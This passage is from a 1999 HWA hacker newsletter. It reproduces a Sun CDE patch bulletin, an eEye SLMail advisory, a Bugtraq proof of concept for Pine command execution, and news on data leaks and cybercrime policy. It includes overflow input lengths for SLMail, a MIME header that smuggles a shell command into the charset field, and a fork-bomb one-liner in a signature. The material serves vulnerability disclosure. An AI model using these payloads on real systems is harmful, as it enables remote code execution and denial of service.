+        
+        -----BEGIN PGP SIGNATURE-----
+        Version: 2.6.2
+        
+        iQCVAwUBNsDNq7dzzzOFBFjJAQEW2AQAhwzM5IgjrTmjzxu9NbheZ8cGH2xtiLId
+        At89187MXvjXuTw44HUiulBQtJoKYdhf9yiU+n0BtUAUpRsXMtu/mtOkwajMAzRi
+        
+lZ+Js93s1x3o6GY8qy+jbl4m7zLLrzRx6V+T+DwjWFVZ5RfW+57MEgEx3kTgCEzt
+        c+KlX2EGnP0=
+        =XsT5
+        -----END PGP SIGNATURE-----
+
+        
+        Date: Wed, 10 Feb 1999 12:01:34 -0800
+        From: secure@sunsc.Eng.Sun.COM (Sun Security Coordination Team)
+        Message-Id: <199902102001.MAA25297@sunsc.eng.sun.com>
+        To: CWS@sunsc.Eng.Sun.COM
+        Subject: Sun Security Bulletin #00185
+        X-Sun-Charset: US-ASCII
+        
+        -----BEGIN PGP SIGNED MESSAGE-----
+        
+        ________________________________________________________________________________
+        		   Sun Microsystems, Inc. Security Bulletin
+        		
+        Bulletin Number:	#00185
+        Date: 			February 10, 1999
+        
+Cross-Ref:		CERT CA-98.02
+        Title:			Common Desktop Environment (CDE)
+        ________________________________________________________________________________
+        
+        The information contained in this Security Bulletin is provided "AS IS." 
+        Sun makes no warranties of any kind whatsoever with respect to the information 
+        contained in this Security Bulletin. ALL EXPRESS OR IMPLIED CONDITIONS, 
+        REPRESENTATIONS AND WARRANTIES, INCLUDING ANY WARRANTY OF NON-INFRINGEMENT OR 
+        IMPLIED WARRANTY OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE, ARE 
+        HEREBY DISCLAIMED AND EXCLUDED TO THE EXTENT ALLOWED BY APPLICABLE LAW.
+        
+        IN NO EVENT WILL SUN MICROSYSTEMS, INC. BE LIABLE FOR ANY LOST REVENUE, 
+        PROFIT OR DATA, OR FOR DIRECT, SPECIAL, INDIRECT, CONSEQUENTIAL, INCIDENTAL 
+        OR PUNITIVE DAMAGES HOWEVER CAUSED AND REGARDLESS OF ANY THEORY OF LIABILITY 
+        ARISING OUT OF THE USE OF OR INABILITY TO USE THE INFORMATION CONTAINED IN 
+        THIS SECURITY BULLETIN, EVEN IF SUN MICROSYSTEMS, INC. HAS BEEN ADVISED OF 
+        THE POSSIBILITY OF SUCH DAMAGES.
+        
+        If any of the above provisions are held to be in violation of applicable law, 
+        void, or unenforceable in any jurisdiction, then such provisions are waived 
+        to the extent necessary for this disclaimer to be otherwise enforceable in 
+        such jurisdiction.
+        ________________________________________________________________________________
+        
+        1.  Background
+        
+            Several vulnerabilities in the Common Desktop Environment (CDE) may be
+            be exploited to gain root access and remove arbitrary files.
+        
+        2.  Affected Supported Versions
+                
+            Solaris(tm) versions:   2.6, 2.6_x86, 2.5.1, 2.5.1_x86, 2.5,
+                                    2.5_x86, 2.4 and 2.4_x86 running CDE
+                                    
+            Solaris 7 is not affected.              
+                           
+        3.  Recommendations
+        
+            Sun recommends that you install the respective patches immediately
+            on affected systems.
+            
+            CDE Version         Patch ID        
+            ___________         _________ 
+            1.2			106112-03
+            			105837-02
+            1.2_x86		106113-03 
+            	    		105838-02
+            1.0.2		104661-07
+            			104498-05
+            			103882-09
+            1.0.2_x86		104663-08
+              			104500-05
+              			103886-08
+            1.0.1		104660-04
+            			104497-05
+            			103884-07
+            1.0.1_x86		104662-05
+            			104499-05
+            			103885-07
+              
+        _______________________________________________________________________________
+        APPENDICES
+        
+        A.  Patches listed in this bulletin are available to all Sun customers via 
+            World Wide Web at:
+            
+            	<URL:http://sunsolve.sun.com/sunsolve/pubpatches/patches.html>
+        
+        B.  Checksums for the patches listed in this bulletin are available via 
+            World Wide Web at:
+        
+            	<URL:http://sunsolve.sun.com/sunsolve/pubpatches/patches.html>
+        
+        C.  Sun security bulletins are available via World Wide Web at:
+        
+        	<URL:http://sunsolve.sun.com/sunsolve/secbulletins>
+        	
+        D.  Sun Security Coordination Team's PGP key is available via World Wide Web 
+            at:
+        
+        	<URL:http://sunsolve.sun.com/sunsolve/secbulletins/SunSCkey.txt>
+        		    	    	    
+        E.  To report or inquire about a security problem with Sun software, contact 
+            one or more of the following:
+          
+                - Your local Sun answer centers
+                - Your representative computer security response team, such as CERT 
+                - Sun Security Coordination Team. Send email to:
+        	
+             		security-alert@sun.com
+        
+        F.  To receive information or subscribe to our CWS (Customer Warning System) 
+            mailing list, send email to:
+            
+            		security-alert@sun.com
+           
+            with a subject line (not body) containing one of the following commands:
+        
+                Command         Information Returned/Action Taken
+                _______         _________________________________
+        
+                help            An explanation of how to get information
+                
+                key             Sun Security Coordination Team's PGP key
+        	
+                list            A list of current security topics
+        
+                query [topic]   The email is treated as an inquiry and is forwarded to 
+                                the Security Coordination Team
+        
+                report [topic]  The email is treated as a security report and is
+                                forwarded to the Security Coordination Team. Please 
+                                encrypt sensitive mail using Sun Security Coordination
+                                Team's PGP key
+        
+                send topic      A short status summary or bulletin. For example, to 
+                                retrieve a Security Bulletin #00138, supply the 
+                                following in the subject line (not body):
+                		
+                                        send #138
+        
+                subscribe       Sender is added to our mailing list.  To subscribe, 
+                                supply the following in the subject line (not body):
+        
+                                    	subscribe cws your-email-address
+        			
+                                Note that your-email-address should be substituted
+                                by your email address.
+        			
+                unsubscribe     Sender is removed from the CWS mailing list.
+        ________________________________________________________________________________
+        
+        Copyright 1999 Sun Microsystems, Inc. All rights reserved. Sun, 
+        Sun Microsystems, Solaris and SunOS are trademarks or registered trademarks 
+        of Sun Microsystems, Inc. in the United States and other countries. This 
+        Security Bulletin may be reproduced and distributed, provided that this 
+        Security Bulletin is not modified in any way and is attributed to 
+        Sun Microsystems, Inc. and provided that such reproduction and distribution 
+        is performed for non-commercial purposes.
+        
+        
+        
+        -----BEGIN PGP SIGNATURE-----
+        Version: 2.6.2
+        
+        iQCVAwUBNsDNu7dzzzOFBFjJAQGpVgQApC+yMuvC1Nr7GprSaZl0mzMUQjz1iOba
+        AzDYjksWY5iL+k/aDMuItJ9v/0TGSU7uQkxx64klQjqSmLRD3WZX51c4s9+VppFa
+        V/Y4cf8h2woEenQM8wVwrg2S0rbOTFllnwB3UhT8LkhTC4Qeno8W8TEVTpQOwvhg
+        lhPafl3ka/8=
+        =Ub3k
+        -----END PGP SIGNATURE-----
+
+
+  5.2  eEYe security advisories - Feb 1999
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       ________________________________________________________________________
+
+       eEye Digital Security Team <e>
+       www.eEye.com
+       info@eEye.com
+       February 04, 1999
+       ________________________________________________________________________
+       
+       Multiple SLMail Vulnerabilities
+       
+       Systems Affected
+       SLMail 3.1
+       
+       Release Date
+       February 04, 1999
+       
+       Advisory Code
+       AD02041999
+       
+       ________________________________________________________________________
+       
+       Description:
+       ________________________________________________________________________
+       
+       We were once again grinding software through Retina Alpha code and have
+       found the following.
+       
+       One of the ports that SLMail's POP Service listens on is port 27. It
+       provides ESMTP functionality. The only difference between it and SLMail's
+       SMTP service is that port 27 provides the "turn" functions. All
+       vulnerabilities are based off of the port 27 service.
+       
+       The first vulnerability involves the "helo" command. There are two
+       vulnerabilities within it. The first is sending "helo" followed by 819 to
+       849 characters. This will send the servers CPU to idle around 90%.
+       
+       The second vulnerability in the "helo" command is a buffer overflow. If you
+       issue "helo" followed by 855 to 2041 characters the server will crash with
+       your typical overflow error.
+       
+       The second set of vulnerabilities are with the "vrfy" and "expn" commands.
+       We have not tested to find the start and stop string lengths but sending
+       "vrfy" or "expn" with 2041 characters will cause the SLMail.exe to exit
+       itself.
+       
+       So we can either send the CPU to 90%, overflow some buffers, or have the
+       server exit without a trace. Take your pick.
+       
+       ________________________________________________________________________
+       
+       Vendor Status
+       ________________________________________________________________________
+       
+       We gave SeattleLabs a week. We have no reply so far. Contact them directly
+       and maybe they will respond.
+       
+       ________________________________________________________________________
+       
+       Copyright (c) 1999 eEye Digital Security Team
+       ________________________________________________________________________
+       
+       Permission is hereby granted for the redistribution of this alert
+       electronically. It is not to be edited in any way without express consent of
+       eEye. If you wish to reprint the whole or any part of this alert in any
+       other medium excluding electronic medium, please e-mail alert@eEye.com for
+       permission.
+       
+       ________________________________________________________________________
+       
+       Disclaimer:
+       ________________________________________________________________________
+       
+       The information within this paper may change without notice. Use of this
+       information constitutes acceptance for use in an AS IS condition. There are
+       NO warranties with regard to this information. In no event shall the author
+       be liable for any damages whatsoever arising out of or in connection with
+       the use or spread of this information. Any use of this information is at the
+       user's own risk.
+       
+       Please send suggestions, updates, and comments to:
+       eEye Digital Security Team
+       info@eEye.com
+       http://www.eEye.com
+       
+       Vendor response:
+       
+       Approved-By: Russ.Cooper@RC.ON.CA
+       Date:         Thu, 4 Feb 1999 23:58:24 GMT
+       Reply-To: lt@seattlelab.com
+       Sender: Windows NT BugTraq Mailing List <NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM>
+       From: Lee Thompson <lt@seattlelab.com>
+       Subject:      Multiple SLMail Vulnerabilities
+       To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
+       
+       We are working on a fix and will be including it in our SLmail 3.2 maintenance
+       release.
+       
+       
+       _
+       Lee Thompson                       lt@seattlelab.com
+       Seattle Lab Inc.           http://www.seattlelab.com
+       Product Manager
+
+    
+       @HWA
+       
+  6.0  Arbitrary command execution in Pine in latest release
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+              
+       Date: Mon, 8 Feb 1999 00:22:17 +0100
+       From: Michal Zalewski <lcamtuf@IDS.PL>
+       To: BUGTRAQ@netspace.org
+       Subject: remote exploit on pine 4.10 - neverending story?
+       
+       Affected systems:
+       -----------------
+       
+         Any Un*x system running 'pine' up to version 4.10 (latest).
+       
+       Compromise:
+       -----------
+       
+         Remote execution of arbitrary code when message is viewed.
+       
+       Details:
+       --------
+       
+         About five months ago, I reported vunerability in metamail package used
+         with pine. I also noticed that '`' character is incorrectly expanded by
+         pine. Problem has been ignored (probably noone understood what I am
+         talking about?;-). But no matter. An exception from /etc/mailcap:
+       
+         text/plain; shownonascii iso-8859-1 %s; test=test "`echo %{charset} | tr
+         '[A-Z]' '[a-z]'`" = iso-8859-1; copiousoutput
+       
+       Impact:
+       -------
+       
+         And now, ladies and gentelmen - my old bug, reinvented. Usually, above
+         mailcap line is expanded to:
+       
+         [...] execve </bin/sh> (sh) (-c) (test "`echo 'US-ASCII' | tr '[A-Z]'
+               '[a-z]'`" = iso-8859-1)
+       
+         Hmm, but take a look at this message:
+       
+       ************************** MIME MESSAGE FOLLOWS **************************
+       >From: Attacker <attacker@eleet.net>
+       To: Victim <victim@somewhere.net>
+       Subject: Happy birthday
+       ...
+       MIME-Version: 1.0
+       Content-Type: MULTIPART/MIXED; BOUNDARY="8323328-235065145-918425607=:319"
+       
+       --8323328-235065145-918425607=:319
+       Content-Type: TEXT/PLAIN; charset='US-ASCII'
+       
+       Make a wish...
+       
+       --8323328-235065145-918425607=:319
+       Content-Type: TEXT/PLAIN; charset=``touch${IFS}ME``; name="logexec.c"
+       Content-Transfer-Encoding: BASE64
+       Content-Description: wish
+       Content-Disposition: attachment; filename="wish.c"
+       
+       ...it could be your last.
+       *************************** MIME MESSAGE ENDS ***************************
+       
+        The result is:
+       
+         [...] execve </bin/sh> (sh) (-c) (test "`echo '``touch${IFS}ME``' | tr
+               '[A-Z]' '[a-z]'`" = iso-8859-1)
+       
+         ...and arbitrary code ('touch ME', encoded using ${IFS} trick) is
+         executed when message is viewed.
+       
+       Fix:
+       ----
+       
+         Well, it's the second time I report problems with ` in headers.
+         Maybe pine developers should wait a little longer ;-)
+       
+       _______________________________________________________________________
+       Michal Zalewski [lcamtuf@ids.pl] [ENSI / marchew] [dione.ids.pl SYSADM]
+       [lunete.nfi.pl SYSADM] [http://dione.ids.pl/lcamtuf] bash$ :(){ :|:&};:
+       [voice phone: +48 (0) 22 813 25 86] ? [pager (MetroBip): 0 642 222 813]
+       Iterowac jest rzecza ludzka, wykonywac rekursywnie - boska [P. Deutsch]
+       
+  7.0  Hacking in Germany by Qubik
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+       Hacking in Germany.
+       ©1999 HWA/Qubik
+
+         Though visiting Germany is a very common thing for myself, the trip
+       I took last month was the first where I've actually looked into the 
+       Germany hacker scene..
+
+         The German press seem to support so much of the hacker ethic, the
+       magazines and newspapers are full of interesting interviews, updates
+       and facts. Rather than trying to cover up the fact that hacker exist,
+       like so many others do, they embrace the fact and try to teach the 
+       country of what they do and why they do it. Take for example, CHIP, 
+       it's a computer magazine full of interesting news, not just pages and
+       pages of adverts! One of the articles compares the new generation of 
+       hackers, against what is seen in films. It's full of information on 
+       the CCC, Karl Koch and an interesting interview with Christoph Fischer,
+       who doesn't seem like an idiot reading a script..!
+
+        This all leads to a strange, yet pleasing, affect, whereby both the 
+       hacker and your average Joe, get along without much tension, and from
+       the impression I got from my associates, hackers in Germany are widely
+       respected.
+
+        But even in the heaven of Germany, hackerdom is looked down on upon by
+       many, but at least there's a distinction between the good and bad hackers.
+       Who knows, maybe one day I'll move to Germany and live in reasonable peace..
+
+       Links:  http://www.chip.de/
+               http://www.ccc.de/
+
+       Have your say: qubik@bikkel.com
+                  cc: hwa@press.usmc.net    
+
+
+8.0  Spotlight on: Project Gamma
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~   
+  
+       Underground Sites - Project Gamma
+       ©1999 HWA/Qubik
+  
+         In the first of a continuing series of reviews, I take a look into a 
+       group called Project Gamma. Who are they? What do they do? And why do 
+       they  do it!? Despite consisting of a nice layout and some great content, 
+       Project Gamma has remained one of the more hidden underground sites. 
+       Having come from solid background as a division of Gamma Force, it's
+       slowly grown into a widely respected resource..
+  
+         It's current membership stands at a healthy five, with the webmaster, 
+       WHiTe VaMPiRe, working non-stop to keep everything working smoothly. The
+       site includes some good news content, specifically targeted at the 
+       underground and some great extras such as the Top100 and webrings.
+  
+         I spoke to him and asked him what it was that compelled him to work as 
+       hard as he does, and like a seasoned spokesperson, he replied with an almost
+       scripted answer..  "I'm just trying to make the most out of my time online."
+       We all know the truth of being an admin of any site, is the attention we get
+       from the opposite sex..!
+  
+        This site deserves more visitors, so if you've got to see one site today,
+       why not make it this one!?
+  
+       Links: http://www.projectgamma.com/
+              http://www.gammaforce.org/
+  
+       Have your say: qubik@bikkel.com   
+                  cc: hwa@press.usmc.net    
+     
+       @HWA       
+       
+  9.0 Secret Cyber Sex; Gary, your secret is out!
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      
+      Via HNN Source: Nando Times, Kansas City Star
+      
+      Nando: http://www.techserver.com/story/0,1643,17514-28909-212134-0,00.html
+      KCS: http://www.kcstar.com/item/pages/home.pat,local/30dabe6b.211,.html   
+      
+      This is gawd knows how many times in recent weeks that a "misconfigured"
+      search engine has spewed out data to netizens that was intended to be on
+      secure servers or at least supposedly stored in confidence, this time 
+      Hallmark sucks the bullet for this boner:
+      
+      
+     Hallmark computer glitch sends intimate online
+     greetings into public cyberspace 
+
+      Copyright © 1999 Nando Media
+      Copyright © 1999 Associated Press
+
+     KANSAS CITY, Mo. (February 12, 1999 7:50 a.m. EST http://www.nandotimes.com) - The lovers and
+     flirts sending e-mail Valentines and other notes on Hallmark Cards' online site no doubt
+     intended their musings to be perused only by that special someone. 
+     
+     Unwittingly, they had a potential audience of millions. 
+     
+     A programming error at hallmark.com allowed anyone with a computer and some curiosity to
+     search the Web site for private love notes - and, in many cases, the senders' name, home and
+     e-mail addresses and place of employment. 
+     
+     The security breach surprised customers and executives at the Kansas City-based company,
+     which this week scrambled to modify the computer program after The Kansas City Star
+     reported the problem. Technicians have since deleted all of the old messages. 
+     
+     A Hallmark official said the problem involved only greetings sent a year or more ago. 
+     
+     "It was a programming error," company spokeswoman Julie O'Dell said. "We certainly are
+     committed to providing privacy." 
+     
+     The recipient of a cyber Hallmark greeting card first gets an e-mail from the company, including
+     a password. Then he or she clicks on a Web address to view the card. 
+     
+     But until this week, all those messages were available to anyone who used the site's search
+     engine, the newspaper reported. That means if the word "bear" was typed, for example,
+     Hallmark's computer would have given you a list of Web pages including that word - including
+     one page featuring a sweet message from "Teddy Bear" to his "Honey." 
+     
+     "I had no idea," said Gary Harders of Chicago, who sent one of the cards to his wife. "I
+     assumed it was private. 
+     
+     "It defeats the whole purpose of sending somebody a personal card if everybody and his
+     brother is going to get ahold of it. It could be embarrassing." 
+     
+     O'Dell said she had no idea how many people might have clicked through the greetings. 
+     
+     "This new system has, built in, a new standard to ensure this kind of thing doesn't happen
+     again," she said. "We don't want a lot of people worried. None of the recent electronic
+     greetings were in that file." 
+     
+     According to the Star, some of the messages were obviously not meant for mass consumption.
+     Among them: 
+     
+     - "Gary & I have been having secret cyber sex via computer." 
+     
+     - "I've seen you swing a sledge hammer and the way your muscles ripple ... is amazing." 
+     
+     - "You deserve an extra foot massage tonight!" 
+     
+     Another writer e-mailed an intimate message and a photo of a flower to a woman friend, trying
+     to entice her into a romantic rendezvous. 
+     
+     "You will have the greatest time you've had in 15 years," he assured his friend - unless the other
+     man in her life persuaded her to stay home with him and their children instead. 
+     
+     @HWA
+     
+ 10.0  Mr. Lewis, your kidney is out!, 'but but i'm DYIN over here'     
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+        Laugh
+        ~~~~~
+        
+        In a frightening real-life drama that played out over the net in front of 
+        approximately 3000 university BS laureates, Mr Donald Lewis 57 had his
+        kidney removed by accident when a malicious cracker re-wrote his scheduled
+        hemmorhoidal clippage to be performed for 'University Web TV' an outfit that
+        doesn't really exist because this article is full of shit, had ya going there
+        huh? well the scary truth follows: taken from Nando times: (via HNN)
+        
+        
+        Don't laugh
+        ~~~~~~~~~~~
+        
+        Michigan medical records accidentally posted on Web
+        for two months 
+
+        Copyright © 1999 Nando Media
+        Copyright © 1999 Associated Press
+
+        ANN ARBOR, Mich. (February 12, 1999 12:22 a.m. EST http://www.nandotimes.com)
+        - Several thousand patient records at the University of Michigan Medical Center
+        were available through public Internet sites for two months. 
+       
+       "Luckily, we were notified and able to stop it this time before real damage was 
+       done," spokesman Dave Wilkins said. "Still, on all fronts, we're taking it very
+       seriously." 
+           
+       The problem was discovered Monday when a university student searching for information
+       about a doctor on the medical center's Web site was linked to files containing private
+       patient records.
+             
+       The records contained names, addresses, phone numbers, Social Security numbers,
+       employment status, treatments for specific medical conditions and other data. The
+       information was used to schedule appointments, Wilkins said. 
+       
+       No one accessed the records until Monday, he said. 
+       
+       "I'm certainly not happy about it," said Cary Johnson, a nurse at the medical center whose
+       2-year-old son's record was exposed. "I guess technology is helping us to do some things and
+       hurting us in other ways." 
+        
+       (Sounds like a real pain in the ass ... this reminds me of a time way back in the 80's
+       when a local drugstore kindly donated an old Ohio Scientific multi-processor 6502
+       based machine with a 17" winchester drive in it, complete with medical records, to
+       my computer collection, so much for privacy, guess we haven't come much further
+       in regards to people's medical record privacy today. I mean sure I have an honest
+       face but... maybe someday i'll put that box on the net, or perhaps it would make
+       a great bar fridge or safe housing..hrm..but I digress. - Ed)
+       
+              
+       @HWA
+      
+ 11.0  Free email account vulnerabilities
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+       I've mentioned before that Hotmail and the like are not anonymous services and it
+       should come as no surprise to anyone that they are also likely targets for crackers
+       and are probably (I wouldn't know *g*) full of security holes. The biggest "hole"
+       is that unlimited password attempts are allowed and anyone with a real determination
+       to get in that knows anything at all about the target will probably succeed..eventually
+       there are other vulnerabilities beyond the scope of this article that are not discussed
+       and imho more frightening but basically if you want "secure" email ENCRYPT it, if you
+       want anonymity, use nightmail or a remailer but that involves some work on your part.
+       - Ed nightmail ( www.nightmail.com, pretty "anonymous" but full of pr0n banners etc)
+       
+       http://chkpt.zdnet.com/chkpt/zdnu99021301/www.zdnet.com/zdtv/cybercrime/spyfiles/story/0,3700,2205746,00.html     
+
+      Freemail Vulnerabilities
+
+      If you have an account on Hotmail, Yahoo!, or Excite, it's vulnerable to hackers.
+      By Ira Winkler  February 10, 1999 
+      
+      Free email services are a common feature on portal sites, but some of them have serious
+      security vulnerabilities-- specifically, Yahoo! Mail, Excite Mail, and Hotmail. 
+
+      First, these three services allow an unlimited number of log-on attempts. This means that
+      malicious Internet users can perform password guessing and "brute force" password attacks
+      against accounts on those systems. (After three failed log-in attempts, Yahoo! does ask the
+      supposed user if they require help. However, additional log-in attempts are not prevented.) 
+
+      Second, the user is not notified when a number of failed log-in attempts have occurred. If a
+      password attack had been attempted against a user account, the user has no way of knowing. 
+
+      These vulnerabilities affect a lot of Internet surfers. Free email services are extremely
+      popular as a Web-based alternative to regular Internet service provider accounts. The ability to
+      access mail from any Web browser and a certain level of Internet anonymity are great advantages
+      that these accounts offer. Security, however, is a distinct disadvantage. 
+
+      The problems probably are not limited to Yahoo!, Excite, and Hotmail. To test whether a particular
+      site is vulnerable to a brute-force attack, simply try entering incorrect passwords. If the system
+      allows more than ten invalid password entries  without locking out the account, then it probably
+      allows an unlimited number of password-cracking attempts. 
+
+      Password crackers attempt to obtain an account's password by exhaustively guessing
+      word and number combinations. For example, an attacker may use a dictionary as the source of
+      words. More sophisticated password crackers will use word-and-number combinations, such as
+      star99. The most time-consuming technique is to try every possible combination of letters,
+      numbers, and special characters. Such attacks can easily be automated. Password cracking is
+      an extremely common hacker technique. 
+
+      To prevent brute-force attacks, a security function should lock an account after an
+      excessive number of failed log-in attempts, typically three to five. Once an account is
+      locked, the user should be emailed about the failed log-in attempts and told to contact the
+      system administrators, who will verify the user's identity. While this would cause a temporary
+      interruption of service, it would prevent the account from being compromised. This is a
+      basic security practice that is built into most computer operating systems. 
+
+      Admittedly, these vulnerabilities are extremely basic. I was not expecting them to exist on all
+      the systems I examined. I take their presence as an indication that security was not a crucial step
+      in designing these systems. 
+      
+      While the sites all state that users should choose their passwords well, they do not
+      account for attacks that can compromise even the best passwords. This leaves users, who
+      number in the thousands or even hundreds of thousands (industry numbers measure accounts,
+      not the number of users), vulnerable to someone with even trivial programming and hacking skills. 
+
+      While no attacks have been reported, it is likely that they were attempted. It is also a given that
+      they will be attempted and successful unless action is taken. 
+
+      I contacted Yahoo! and Excite press liaisons about this issue and received no official reply.
+      Hotmail could not be reached by telephone, and email messages to its technical support groups
+      were not returned.    
+      
+      continued at the site ...
+      
+      http://chkpt.zdnet.com/chkpt/zdnu99021301/www.zdnet.com/zdtv/cybercrime/spyfiles/story/0,3700,2205746,00.html     
+      
+      @HWA
+ 
+  12.0 Quebec poses hacker challenge to its open networks
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       Seen on HNN: contributed to HNN by Frenchie 
+       
+       Montreal Gazette: http://www.montrealgazette.com/PAGES/990211/2266737.html
+       Yahoo News- French Version : http://biz.yahoo.com/rf/990210/bjo.html
+       
+       
+       QUEBEC WANTS CHALLENGERS TO TEST ITS COMPUTER SECURITY
+
+       PAUL CHERRY
+       The Gazette
+
+       The provincial government is to enlist hackers to test the security
+       of its information networks. 
+
+       A laboratory will be set up using the same computers - standard
+       desktops with 400 megahertz Intel processors - used by many
+       government services "as well as those used by hackers,"
+       Paul-Andre Comeau, president of the province's Access to
+       Information Commission, said yesterday. 
+
+       The aim is inform people in charge of computers of recent
+       innovations and of the relative advantages or disadvantages of
+       new gadgets. 
+
+       "We will also be able to check out how safe the systems can be
+       and how they can be improved," Comeau said. 
+
+       "In that respect, of course, we will have to be helped by outside
+       people and, at times, like the RCMP does in 
+
+       Ottawa, by hackers who are converted." 
+
+       Comeau said reformed hackers are referred to as "white
+       hackers" by the people who now hire them to protect systems. 
+
+       A 24-year-old former hacker, interviewed by The Gazette last
+       week, now protects an international computer network based in
+       Montreal. 
+
+       When he was 15, he was able to infiltrate Russian research
+       computers - until he was caught and agreed to lecture RCMP
+       staff on how hackers crack government systems to get
+       information. 
+
+       Comeau said someone tried for hours to hack into the
+       commission's network two years ago, on a Saturday afternoon. 
+
+       He said the demand for the extra protection has come not from
+       the larger government ministries and organizations, but from
+       smaller ones that are now trying to modernize and join
+       established computer networks. 
+
+       Another objective of the laboratory is to advise government
+       services on what types of equipment to buy. 
+
+       Even simple things like fax machines should be considered with
+       security in mind, Comeau said. 
+
+       He said the committee is advising government services against
+       sending personal information via faxes, except in exceptional
+       circumstances and after taking precautionary steps. 
+
+       "We hope that in the coming year, 
+
+       we will be able to advise hospitals and social institutions to do
+       their own evaluation of their systems," he said, adding that a lot
+       of money is about 
+
+       to be invested in new information systems. 
+
+       The laboratory will also examine the safety of equipment used
+       for sharing data among institutions like hospitals and municipal
+       administrations, which keep information that falls under privacy
+       laws. 
+       
+       ©1998 The Gazette, a division of Southam Inc.
+       
+       @HWA                             
+       
+       
+ 13.0  News from Tokyo 
+       ~~~~~~~~~~~~~~~
+       
+       Contributed by Wile, source: Associated Press (c) 1999 AP
+       
+       TOKYO (AP)  At a secret location somewhere in Tokyo, dozens
+       of specialists in cryptography and electronic media will soon be
+       hard at work patrolling cyberspace.
+    
+       Due to open by July, the new headquarters for the National Police
+       Agency's ``cyber-cop'' squad signals growing concern about
+       computer security as more and more Japanese join the global
+       online revolution.
+    
+       And while unauthorized computer snooping in Japan is less
+       common than in the United States, a sharp jump in
+       computer-related crimes in recent years has rattled authorities.
+    
+       The increase is no surprise  legally, Japan is a hacker's heaven.
+    
+       Breaking into a computer system isn't even a crime in Japan,
+       which sets it apart from most other major industrialized nations.
+       Hackers are free to peep at sensitive data stored in Japanese
+       mainframes so long as they don't destroy or sell any of it.
+    
+       ``We have fallen behind other countries in this area,'' said Kei
+       Hata, a member of Parliament who serves as deputy head of the
+       ruling party's Internet policy committee. ``It's a problem which
+       must be addressed quickly.''
+    
+       Worry about the potential for computer-generated chaos has
+       prompted Tokyo to draft legislation to outlaw unauthorized
+       access. A bill is expected to be submitted in the current session of
+       Parliament, which ends in June.
+    
+       The move comes amid pressure from Washington to bolster
+       international efforts to fight crime in cyberspace and dismay in
+       Japan over abuses such as the widespread transmission of child
+       pornography and even poison sales via suicide-related Websites.
+    
+       The problem is still relatively new to Japan.
+    
+       In 1997, the number of high-tech crimes known to Japanese police
+       climbed to 263, up from 178 the previous year and just 32 in
+       1993.
+    
+       Still, a recent NPA survey showed that only 4 percent of
+       companies and colleges polled reported cases of unauthorized
+       access serious enough to inflict damage on their computer
+       systems.
+    
+       By comparison, the San Francisco-based Computer Security
+       Institute and the FBI found that 64 percent of 520 U.S.
+       corporations, government agencies, financial institutions and
+       universities responding to a 1998 survey had at least one
+       computer security violation within the previous 12 months. More
+       than 70 percent suffered financial losses.
+    
+       Japanese police suspect the true number of computer crimes is
+       much higher than the official figure, and note that many
+       businesses keep security problems under wraps to avoid negative
+       publicity.
+    
+       Companies are particularly reluctant to disclose entanglements
+       with organized crime syndicates, known as the yakuza.
+    
+       ``The yakuza have moved into this field,'' said Shunichi Kawabe,
+       an official in the NPA's information technology bureau. ``They are
+       very interested in making money in this type of business.''
+    
+       He said Internet-brokered gun trafficking, Web page-based
+       pornography distribution and computer-generated financial fraud
+       are among the areas suspected of being targeted.
+    
+       Thrill-seekers are also stirring up trouble.
+    
+       One hacker broke into a computer network used by the Hokkaido
+       University of Education in northern Japan and gained access to
+       login IDs and passwords used by about 1,000 employees and
+       students. The university uncovered the security breach last
+       month and shut down the entire network.
+    
+       Japan plans to step up computer training programs for police, but
+       authorities acknowledge they have a long way to go before
+       catching up with their counterparts in the United States.
+    
+       The good news for the cops is that Japanese hackers also lag
+       behind their cohorts overseas.
+    
+       ``Domestic cyber-criminals are still low-tech,'' said Kawabe.
+    
+       @HWA
+                 
+  H.W  Hacked websites
+       ~~~~~~~~~~~~~~~
+       
+       HNN: contributed by telephrk (via HNN http://www.hackernews.com/)
+       Jordon Cracked
+       This is presumably the first web site crack in the country of
+       Jordan.
+       http://www.go.com.jo
+                                            
+     
+                 
+  A.0  APPENDICES
+       ~~~~~~~~~~   
+        
+
+  A.1  PHACVW, sekurity, security, cyberwar links
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+       The links are no longer maintained in this file, there is now a 
+      links section on the http://welcome.to/HWA.hax0r.news/ url so check
+      there for current links etc.
+    
+      The hack FAQ (The #hack/alt.2600 faq)
+      http://www-personal.engin.umich.edu/~jgotts/underground/hack-faq.html
+    
+      Hacker's Jargon File (The quote file)
+      http://www.lysator.liu.se/hackdict/split2/main_index.html
+    
+   
+
+      International links:(TBC)
+      ~~~~~~~~~~~~~~~~~~~~~~~~~
+      
+      Foreign correspondants and others please send in news site links that
+      have security news from foreign countries for inclusion in this list
+      thanks... - Ed
+      
+      Netherlands...: http://security.pine.nl/
+      Russia........: http://www.tsu.ru/~eugene/
+      Indonesia.....: http://www.k-elektronik.org/index2.html
+                      http://members.xoom.com/neblonica/
+      Brasil........: http://www.psynet.net/ka0z
+                      http://www.elementais.cjb.net           
+
+    Got a link for this section? email it to hwa@press.usmc.net and i'll 
+    review it and post it here if it merits it. 
+    
+    
+
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-  
+    --EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--       
+       
+    © 1998, 1999 (c) Cruciphux/HWA.hax0r.news
+    (r) Cruciphux is a trade mark of Harpies With Ailments corp.
+    
+
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+  
